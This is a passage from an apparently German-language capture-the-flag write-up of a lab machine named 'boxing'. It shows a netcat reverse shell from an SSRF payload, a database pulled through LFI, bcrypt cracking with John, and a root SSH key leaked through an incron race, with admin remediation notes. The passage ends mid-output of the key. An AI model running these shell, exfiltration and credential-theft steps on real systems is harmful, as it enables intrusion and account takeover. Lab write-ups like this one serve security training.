+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.114] 42512
+id
+uid=33(www-data) gid=33(www-data) groupes=33(www-data)</pre> <!-- Shell erhalten! -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. Ein Netcat-Listener wird gestartet (erst auf 4445, dann korrekt auf 6666).
+            2. Der `curl`-Befehl sendet einen RCE-Payload via SSRF. Der Payload `system+-e+nc+-c+bash+192.168.2.199+6666` (URL-dekodiert) ist syntaktisch ungewöhnlich, aber führt offenbar dazu, dass eine Bash-Reverse-Shell zum Angreifer auf Port 6666 gestartet wird.
+            3. Der Netcat-Listener auf Port 6666 empfängt die Verbindung. Ein Test mit `id` bestätigt die Shell als `www-data`.</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Erfolgreiche Erlangung einer Shell als `www-data` durch Ausnutzung der RCE über SSRF.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Beginne mit der Privilegienerweiterungs-Phase. Stabilisiere die Shell bei Bedarf.
+            <br>**Empfehlung (Admin):** Behebe LFI, SSRF und RCE. Überprüfe die Sicherheit des internen Dienstes auf Port 5000.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <p class="comment">Untersuchung des Verzeichnisses `/opt/sos` und der darin enthaltenen Skripte.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt$ <span class="command">cd sos/</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">ls -la</span></div>
+                     <pre>
+total 20
+drwxr-xr-x 3 root root 4096  4 févr. 03:15 .
+drwxr-xr-x 4 root root 4096  4 févr. 03:15 ..
+-rwxr-xr-x 1 root root  298  4 févr. 03:15 incrontab.sh
+drwxr-xr-x 2 root root 4096  4 févr. 17:20 logs
+-rwxr-xr-x 1 root root  323  4 févr. 03:15 sos.sh</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">cat sos.sh</span></div>
+                     <pre>
+#!/bin/bash
+
+logs="/opt/sos/logs/output-logs.txt"
+rm $logs
+exec &>$logs
+
+cd /home/cassius
+file *
+ss -altupn
+last -a
+w
+ps aux
+top -n 1
+lsof
+
+for user in $(cut -f1 -d: /etc/passwd); do
+echo "Cron jobs for $user:"
+crontab -u $user -l
+done
+
+tail /var/log/syslog
+sha256sum /bin/* /sbin/* /usr/bin/* /usr/sbin/*
+
+chmod 700 $logs</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">cat /etc/crontab</span></div>
+                     <pre>
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root	cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.daily; }
+47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.weekly; }
+52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / &amp;&amp; run-parts --report /etc/cron.monthly; }
+#</pre>
+                 </div>
+             </div>
+             <!-- ll wird nicht gefunden -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">ll</span></div>
+                     <pre>bash: ll : commande introuvable</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">ls -la</span></div>
+                     <pre>
+total 20
+drwxr-xr-x 3 root root 4096  4 févr. 03:15 .
+drwxr-xr-x 4 root root 4096  4 févr. 03:15 ..
+-rwxr-xr-x 1 root root  298  4 févr. 03:15 incrontab.sh
+drwxr-xr-x 2 root root 4096  4 févr. 17:20 logs
+-rwxr-xr-x 1 root root  323  4 févr. 03:15 sos.sh</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">cat incrontab.sh</span></div>
+                     <pre>
+#!/bin/bash
+
+echo '/etc/apache2/sites-available/000-default.conf IN_MODIFY systemctl restart apache2' | incrontab -
+echo '/etc IN_DELETE,IN_MODIFY,IN_MOVED_FROM /bin/echo "File: $@/$# => $%" > /root/user_flag.log' | incrontab -
+echo '/home/cassius/user.txt IN_ATTRIB /opt/sos/sos.sh' | incrontab -</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            <ul>
+                <li>Im Verzeichnis `/opt/sos` befinden sich zwei Skripte (`sos.sh`, `incrontab.sh`) und ein Unterverzeichnis `logs`, alle gehören `root`.</li>
+                <li>`sos.sh`: Löscht zuerst die Logdatei `/opt/sos/logs/output-logs.txt`, leitet dann alle Ausgaben (stdout & stderr) in diese Logdatei um, wechselt nach `/home/cassius`, führt dort eine Reihe von Informationssammel-Befehlen aus (`file *`, `ss`, `last`, `ps`, `crontab -l` für alle User etc.) und schränkt am Ende die Berechtigungen der Logdatei auf `700` (rwx für Besitzer) ein.</li>
+                <li>`/etc/crontab`: Zeigt keine ungewöhnlichen systemweiten Cronjobs.</li>
+                <li>`incrontab.sh`: Dieses Skript dient dazu, `incron`-Regeln zu setzen (vermutlich bei der Systemeinrichtung ausgeführt). `incron` überwacht Dateisystemereignisse. Die entscheidende Regel ist die letzte: `echo '/home/cassius/user.txt IN_ATTRIB /opt/sos/sos.sh' | incrontab -`. Sie weist `incron` an, das Skript `/opt/sos/sos.sh` auszuführen, wann immer die Attribute (`IN_ATTRIB` - z.B. Berechtigungen, Zeitstempel durch `touch`) der Datei `/home/cassius/user.txt` geändert werden. Da `incron`-Regeln typischerweise mit den Rechten des Benutzers laufen, der sie eingerichtet hat (vermutlich `root` bei der Systemeinrichtung), wird `/opt/sos/sos.sh` **als Root** ausgeführt.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Kritisch. Eine klare Privilege Escalation-Möglichkeit über `incron`. Eine Änderung der Attribute von `/home/cassius/user.txt` (was `www-data` möglicherweise nicht kann, aber der Benutzer `cassius` definitiv) löst die Ausführung von `/opt/sos/sos.sh` als `root` aus. Das Skript selbst ist nicht beschreibbar, aber sein Verhalten (insbesondere das `cd /home/cassius` und das Schreiben in eine Logdatei) kann potenziell ausgenutzt werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+            1. Erhalte Zugriff als Benutzer `cassius` (dessen Hash bereits gefunden wurde).
+            2. Als `cassius`, erstelle einen symbolischen Link im Home-Verzeichnis, der auf eine wichtige Datei von Root zeigt (z.B. `ln -s /root/.ssh/id_rsa rootkey`).
+            3. Als `cassius`, trigger den `incron`-Job, indem du die Attribute von `user.txt` änderst (z.B. `chmod 777 user.txt`).
+            4. `/opt/sos/sos.sh` wird als Root ausgeführt. Es wechselt nach `/home/cassius` und führt `file *` aus. Dies liest den Anfang der Datei, auf die der Symlink zeigt (`/root/.ssh/id_rsa`).
+            5. Die Ausgabe von `file *` (und aller anderen Befehle im Skript) wird in `/opt/sos/logs/output-logs.txt` geschrieben.
+            6. Implementiere einen Mechanismus (z.B. eine `while true`-Schleife), um `/opt/sos/logs/output-logs.txt` sofort nach seiner Erstellung zu kopieren, *bevor* `sos.sh` am Ende `chmod 700` darauf ausführt und `cassius` den Lesezugriff verliert.
+            7. Extrahiere den privaten SSH-Schlüssel von Root aus der kopierten Logdatei.
+            8. Nutze den Schlüssel für den SSH-Login als Root.
+            <br>**Empfehlung (Admin):** **Dringend:** Entferne die gefährliche `incron`-Regel. Überprüfe alle `incron`-Konfigurationen. `sos.sh` sollte nicht als Root laufen oder zumindest keine Befehle in potenziell vom Benutzer kontrollierbaren Verzeichnissen ausführen oder unsichere Operationen durchführen. Beschränke Berechtigungen.</p>
+
+            <p class="comment">Weitere Enumeration als `www-data`: Suche nach SUID/GUID, sudo, Capabilities, Kernel-Version.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+  1707982     72 -rwsr-xr-x   1 root     root        72000 mars 23  2023 /usr/bin/su
+  1704050     52 -rwsr-xr-x   1 root     root        52880 mars 23  2023 /usr/bin/chsh
+  1707314     48 -rwsr-xr-x   1 root     root        48896 mars 23  2023 /usr/bin/newgrp
+  1707468     60 -rwsr-xr-x   1 root     root        59704 mars 23  2023 /usr/bin/mount
+  1704053     68 -rwsr-xr-x   1 root     root        68248 mars 23  2023 /usr/bin/passwd
+  1704049     64 -rwsr-xr-x   1 root     root        62672 mars 23  2023 /usr/bin/chfn
+  1707470     36 -rwsr-xr-x   1 root     root        35128 mars 23  2023 /usr/bin/umount
+  1704052     88 -rwsr-xr-x   1 root     root        88496 mars 23  2023 /usr/bin/gpasswd
+  1724448     52 -rwsr-xr--   1 root     messagebus    51272 sept. 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+  1726663    640 -rwsr-xr-x   1 root     root         653888 déc. 19 15:51 /usr/lib/openssh/ssh-keysign</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">sudo -l</span></div>
+                     <pre>bash: sudo : commande introuvable</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                     <pre>/usr/bin/ping cap_net_raw=ep</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">ls -la /etc/passwd</span></div>
+                     <pre>-rw-r--r-- 1 root root 1230  4 févr. 16:50 /etc/passwd</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:/opt/sos$ <span class="command">uname -a</span></div>
+                     <pre>Linux boxing 6.1.0-17-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.69-1 (2023-12-30) x86_64 GNU/Linux</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Die Enumerationsbefehle werden erneut ausgeführt:
+            <ul>
+                <li>`find / -type f -perm -4000 ...`: Findet nur Standard-SUID-Binaries. Keine offensichtlichen Schwachstellen.</li>
+                <li>`sudo -l`: `sudo` ist für `www-data` nicht verfügbar/installiert.</li>
+                <li>`getcap -r / ...`: Findet nur `ping` mit `cap_net_raw`. Nicht ausnutzbar für PrivEsc.</li>
+                <li>`ls -la /etc/passwd`: Bestätigt Standardberechtigungen.</li>
+                <li>`uname -a`: Bestätigt die Kernel-Version `6.1.0-17-amd64`.</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Bestätigt, dass Standard-PrivEsc-Vektoren wie SUID-Binaries oder `sudo` hier nicht greifen. Die Kernel-Version ist relevant für Kernel-Exploits, aber der `incron`-Pfad ist vielversprechender.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Fokussiere dich auf den `incron`-Exploit und erlange zuerst Zugriff als `cassius`.
+            <br>**Empfehlung (Admin):** Keine zusätzlichen Maßnahmen basierend auf diesen Ergebnissen.</p>
+
+            <p class="comment">Herunterladen der SQLite-Datenbank (vermutlich über LFI auf Staging) und Extrahieren des Hashes.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://staging-env.boxing.hmv/boxing_database.db --output database.db</span></div>
+                     <pre>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 24576  100 24576    0     0  15.8M      0 --:--:-- --:--:-- --:--:-- 23.4M</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">strings database.db</span></div>
+                     <pre>
+SQLite format 3
+tablenewsnews
+CREATE TABLE news (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    title TEXT NOT NULL,
+    content TEXT,
+    publish_date DATE
+Etablematchesmatches
+CREATE TABLE matches (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    fighter1_id INTEGER,
+    fighter2_id INTEGER,
+    match_date DATE,
+    location TEXT,
+    result TEXT,
+    FOREIGN KEY (fighter1_id) REFERENCES fighters (id),
+    FOREIGN KEY (fighter2_id) REFERENCES fighters (id)
+tablefightersfighters
+CREATE TABLE fighters (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    name TEXT NOT NULL,
+    weight_class TEXT,
+    ranking INTEGER
+Ytablesqlite_sequencesqlite_sequence
+CREATE TABLE sqlite_sequence(name,seq)
+tableusersusers
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT NOT NULL,
+    password_hash TEXT NOT NULL
+cassius$2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu
+	users</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "cassius$2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu" > hash</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. Die Datei `boxing_database.db` wird erfolgreich heruntergeladen, wahrscheinlich durch Ausnutzung der LFI im `url`-Parameter der Staging-Umgebung (`curl http://staging-env.boxing.hmv/index.php?url=boxing_database.db`).
+            2. Der Befehl `strings` wird auf die heruntergeladene SQLite-Datenbank angewendet.
+            3. Die Ausgabe von `strings` zeigt SQL-Schema-Definitionen und lesbare Zeichenketten aus der Datenbank. Darunter befindet sich der Eintrag `cassius$2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu`, der stark nach einem Benutzernamen (`cassius`) und einem zugehörigen Passwort-Hash (bcrypt, erkennbar am `$2b$05$`) aussieht.
+            4. Der Hash wird in eine Datei namens `hash` gespeichert.</p>
+            <p class="evaluation">**Bewertung:** Kritisch. Erfolgreiche Exfiltration der Anwendungsdatenbank und Extraktion eines Passwort-Hashes für den Benutzer `cassius`.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuche, den bcrypt-Hash offline mit John the Ripper oder Hashcat und einer geeigneten Wordlist (ggf. unter Berücksichtigung des Passwort-Hinweises "Cassius!") zu knacken.
+            <br>**Empfehlung (Admin):** Behebe die LFI-Schwachstelle auf dem Staging-Server. Speichere Datenbankdateien niemals im Webroot oder einem öffentlich zugänglichen Verzeichnis. Verwende starke Passwort-Hashing-Algorithmen (bcrypt ist gut, aber der Hash sollte nicht exponiert werden).</p>
+
+            <p class="comment">Hinweise und Vorbereitung zum Knacken des Hashes.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Befehl, sondern Notizen -->
+                    <pre>
+---
+geht nicht <!-- Frühere Knackversuche? -->
+
+https://www.ddosi.org/pass8/ <!-- Link zu Passwort-Generator/Infos? -->
+Cassius!
+
+
+
+--------------------
+
+Cassius!
+cassius!
+CASSIUS!
+cASSIUS!
+CasS
+!suissaC
+Cassius!Cassius!
+... <!-- Viele Variationen -->
+...
+Cassius!29!
+Cassius!30!
+Cassius!31!</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi hhh</span></div>
+                     <pre>
+$2b$05$gPKe1EUBPZidX/j3qTDapeznU4CMfkpMd0sQhgehhhoG/pwc4OnVu</pre> <!-- Hash in Datei hhh gespeichert -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Dieser Abschnitt enthält Notizen und Vorbereitungsschritte zum Knacken des Hashes:
+            <ul>
+                <li>Ein Hinweis "geht nicht" deutet auf frühere erfolglose Versuche hin.</li>
+                <li>Ein Link wird erwähnt.</li>
+                <li>Der Passwort-Hinweis "Cassius!" wird wiederholt.</li>
+                <li>Eine Liste von Variationen des Passworts "Cassius!" wird angedeutet (Groß/Kleinschreibung, Umkehrung, Verdopplung, Anhängen von Zahlen). Diese wurden vermutlich in eine Wordlist (`pass.txt` im nächsten Schritt) gespeichert.</li>
+                <li>Der Hash wird in die Datei `hhh` geschrieben (vermutlich mit `vi` oder `echo`).</li>
+            </ul></p>
+            <p class="evaluation">**Bewertung:** Zeigt den Denkprozess und die Vorbereitung für den gezielten Hash-Cracking-Versuch basierend auf dem Hinweis.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Führe John/Hashcat mit der Datei `hhh` und der generierten Wordlist (`pass.txt`) aus.
+            <br>**Empfehlung (Admin):** Verwende Passwörter, die nicht leicht aus Hinweisen oder durch einfache Mutationen erraten werden können.</p>
+
+            <p class="comment">Knacken des bcrypt-Hashes mit John the Ripper.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=pass.txt hhh</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 32 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<span class="password">Cassius!123</span>      (?)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+1g 0:00:00:00 DONE (2024-04-29 00:33) 50.00g/s 6800p/s 6800c/s 6800C/s Cassius!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** John the Ripper (`john`) wird mit der Wordlist `pass.txt` (die vermutlich Variationen von "Cassius!" enthält) auf die Datei `hhh` (die den bcrypt-Hash enthält) angesetzt. John identifiziert den Hash-Typ korrekt als bcrypt und knackt ihn erfolgreich. Das gefundene Passwort ist `<span class="password">Cassius!123</span>`.</p>
+            <p class="evaluation">**Bewertung:** Kritisch! Das Passwort für den Benutzer `cassius` wurde erfolgreich geknackt.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwende die Zugangsdaten `cassius` / `<span class="password">Cassius!123</span>`, um dich per SSH anzumelden oder `su` zu verwenden.
+            <br>**Empfehlung (Admin):** Das Passwort "Cassius!123" ist zu schwach und basiert auf einem Hinweis. Erzwinge komplexe, nicht erratbare Passwörter.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="comment">Wechsel zum Benutzer `cassius` mit dem geknackten Passwort und Auslesen der User-Flag.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:~/html$ <span class="command">ls /home/</span></div>
+                     <pre>cassius</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@boxing:~/html$ <span class="command">su cassius</span></div>
+                     <pre>Mot de passe : <!-- Passwort "Cassius!123" wird eingegeben -->
+cassius@boxing:/var/www/html$</pre> <!-- Erfolgreicher Wechsel -->
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:/var/www/html$ <span class="command">cd ~</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">ls</span></div>
+                     <pre>user.txt</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">a2b3946358a96bb7a92f61a759a1d972</span></pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:**
+            1. Der Benutzer `cassius` wird im `/home`-Verzeichnis bestätigt.
+            2. Mit `su cassius` und dem Passwort `<span class="password">Cassius!123</span>` wird erfolgreich zum Benutzer `cassius` gewechselt.
+            3. Im Home-Verzeichnis von `cassius` wird die Datei `user.txt` gefunden.
+            4. Der Inhalt von `user.txt` (die User-Flag) wird ausgelesen: `<span class="password">a2b3946358a96bb7a92f61a759a1d972</span>`.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreicher initialer Zugriff als Benutzer `cassius` und Erlangung der User-Flag.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Beginne mit der Privilege Escalation als Benutzer `cassius`. Untersuche die `incron`-Konfiguration und das `/opt/sos`-Verzeichnis.
+            <br>**Empfehlung (Admin):** Sichere das `cassius`-Konto (Passwort ändern). Untersuche und behebe den PrivEsc-Vektor.</p>
+
+        </section>
+
+        <!-- POC Section -->
+        <section id="poc-incron">
+            <h2>Proof of Concept (PrivEsc via Incron Misconfiguration)</h2>
+            <p class="comment">Dieser Abschnitt demonstriert die Ausnutzung der Incron-Fehlkonfiguration zur Eskalation von Benutzer `cassius` zu `root`.</p>
+
+            <p class="analysis">**Schwachstelle:** Eine `incron`-Regel (eingerichtet durch `/opt/sos/incrontab.sh`, vermutlich als root) überwacht die Datei `/home/cassius/user.txt`. Bei einer Attributänderung (`IN_ATTRIB`) wird das Skript `/opt/sos/sos.sh` als `root` ausgeführt. Dieses Skript wechselt nach `/home/cassius` und führt dort u.a. den Befehl `file *` aus, wobei die Ausgabe in `/opt/sos/logs/output-logs.txt` umgeleitet wird. Am Ende setzt das Skript die Berechtigungen der Logdatei auf `700`.</p>
+            <p class="evaluation">**Voraussetzungen:**
+                <ul>
+                    <li>Zugriff als Benutzer `cassius`.</li>
+                    <li>Berechtigung, Dateien und Symlinks in `/home/cassius` zu erstellen.</li>
+                    <li>Berechtigung, die Attribute von `/home/cassius/user.txt` zu ändern (`chmod`).</li>
+                    <li>Ein Mechanismus, um die Logdatei `/opt/sos/logs/output-logs.txt` zu lesen, bevor `sos.sh` die Berechtigungen auf `700` setzt (Race Condition).</li>
+                </ul>
+            </p>
+            <p class="recommendation">**Schritt-für-Schritt Anleitung:**
+                <ol>
+                    <li>Als `cassius`, erstelle einen symbolischen Link im Home-Verzeichnis, der auf den privaten SSH-Schlüssel von Root zeigt: `ln -sf /root/.ssh/id_rsa /home/cassius/rootrsa`.</li>
+                    <li>Starte eine Endlosschleife in einem separaten Terminal oder im Hintergrund, die kontinuierlich versucht, die Logdatei `/opt/sos/logs/output-logs.txt` nach `/home/cassius/` zu kopieren: `while true; do cp /opt/sos/logs/output-logs.txt /home/cassius/output.log 2>/dev/null; done &`</li>
+                    <li>Trigger den `incron`-Job, indem du die Attribute von `user.txt` änderst: `chmod 700 /home/cassius/user.txt`.</li>
+                    <li>Warte kurz, bis `sos.sh` (als root) gelaufen ist. Das Skript führt `cd /home/cassius` und `file *` aus. `file rootrsa` liest `/root/.ssh/id_rsa`. Die Ausgabe (inklusive des Schlüssel-Inhalts, der von `file` gelesen wird) wird in `/opt/sos/logs/output-logs.txt` geschrieben.</li>
+                    <li>Die im Hintergrund laufende Schleife sollte die Logdatei nach `/home/cassius/output.log` kopiert haben, bevor `sos.sh` `chmod 700` darauf anwendet.</li>
+                    <li>Beende die Kopier-Schleife (z.B. mit `fg` und Strg+C).</li>
+                    <li>Extrahiere den privaten SSH-Schlüssel aus der kopierten Datei `/home/cassius/output.log`.</li>
+                    <li>Speichere den Schlüssel in einer Datei (z.B. `rootkey`), setze die Berechtigungen (`chmod 600 rootkey`).</li>
+                    <li>Melde dich als `root` per SSH an: `ssh root@localhost -i rootkey`.</li>
+                </ol>
+            </p>
+
+            <p class="comment">Vorbereiten des Exploits als `cassius`: Erstellen der Datei `-f` (möglicherweise als Störfaktor für `file *`?) und des Symlinks.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">touch -- -f</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">ls</span></div>
+                     <pre>-f  user.txt</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">ln -sf /root/.ssh/id_rsa rootrsa</span></div>
+                     <pre><!-- Keine Ausgabe --></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwx------ 4 cassius cassius 4096 29 avril 00:42 .
+drwxr-xr-x 3 root    root    4096  4 févr. 03:15 ..
+lrwxrwxrwx 1 root    root       9  4 févr. 17:11 .bash_history -> /dev/null
+-rw-r--r-- 1 cassius cassius  220  4 févr. 03:15 .bash_logout
+-rw-r--r-- 1 cassius cassius 3526  4 févr. 03:15 .bashrc
+-rw-r--r-- 1 cassius cassius    0 29 avril 00:41 -f
+drwxr-xr-x 3 cassius cassius 4096  4 févr. 17:14 .local
+-rw-r--r-- 1 cassius cassius  807  4 févr. 03:15 .profile
+lrwxrwxrwx 1 cassius cassius   17 29 avril 00:42 rootrsa -> /root/.ssh/id_rsa
+drwx------ 2 cassius cassius 4096  4 févr. 17:16 .ssh
+-rwx------ 1 cassius cassius   33  4 févr. 03:15 user.txt</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Als Benutzer `cassius` werden die Vorbereitungen für den Incron-Exploit getroffen:
+            1. `touch -- -f`: Erstellt eine leere Datei mit dem ungewöhnlichen Namen `-f`. Das `--` verhindert, dass `-f` als Option interpretiert wird.
+            2. `ln -sf /root/.ssh/id_rsa rootrsa`: Erstellt den symbolischen Link `rootrsa`, der auf den privaten SSH-Schlüssel von Root zeigt.</p>
+            <p class="evaluation">**Bewertung:** Korrekte Vorbereitungsschritte für den Exploit.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Starte nun die Kopierschleife und triggere den Incron-Job.
+            <br>**Empfehlung (Admin):** Keine spezifischen Maßnahmen für diesen Schritt.</p>
+
+            <p class="comment">Trigger des Incron-Jobs und Ausnutzung der Race Condition zum Kopieren der Logdatei.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">chmod 700 user.txt ; while true ; do cp /opt/sos/logs/output-logs.txt . ; done</span></div>
+                     <pre><!-- Keine direkte Ausgabe, Befehl läuft (Schleife im Hintergrund oder Vordergrund) --></pre>
+                     <!-- Annahme: Die Schleife wird gestartet, dann wird Strg+C gedrückt, um sie zu beenden, nachdem die Logdatei kopiert wurde. -->
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Dieser Befehl kombiniert zwei Aktionen:
+             1. `chmod 700 user.txt`: Ändert die Berechtigungen von `user.txt`. Dies löst die `incron`-Regel `IN_ATTRIB` aus, woraufhin `/opt/sos/sos.sh` als Root ausgeführt wird.
+             2. `while true ; do cp /opt/sos/logs/output-logs.txt . ; done`: Startet eine Endlosschleife, die versucht, die Logdatei `/opt/sos/logs/output-logs.txt` (die von `sos.sh` beschrieben wird) kontinuierlich in das aktuelle Verzeichnis (`/home/cassius`) zu kopieren. Ziel ist es, die Datei zu erwischen, nachdem `sos.sh` den Schlüssel hineingeschrieben hat, aber bevor es `chmod 700` darauf anwendet.</p>
+            <p class="evaluation">**Bewertung:** Korrekte Methode zur Auslösung des Incron-Jobs und zur Ausnutzung der Race Condition, um die Logdatei mit den Root-Berechtigungen zu kopieren.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfe die kopierte Logdatei auf den Inhalt des Root-SSH-Schlüssels.
+            <br>**Empfehlung (Admin):** Behebe die Incron-Fehlkonfiguration.</p>
+
+             <p class="comment">Anzeige des Inhalts der kopierten Logdatei, die den privaten SSH-Schlüssel enthält.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">cassius@boxing:~$ <span class="command">head -n 100 output-logs.txt</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----:                                    cannot open `-----BEGIN OPENSSH PRIVATE KEY-----' (No such file or directory)
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: cannot open `b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn' (No such file or directory)
+NhAAAAAwEAAQAAAYEAkCCrCRmGy14hu1qi9J8dDoKUkmRuaPtO2ToC3S/aexmwuG0Q4i65: cannot open `NhAAAAAwEAAQAAAYEAkCCrCRmGy14hu1qi9J8dDoKUkmRuaPtO2ToC3S/aexmwuG0Q4i65' (No such file or directory)
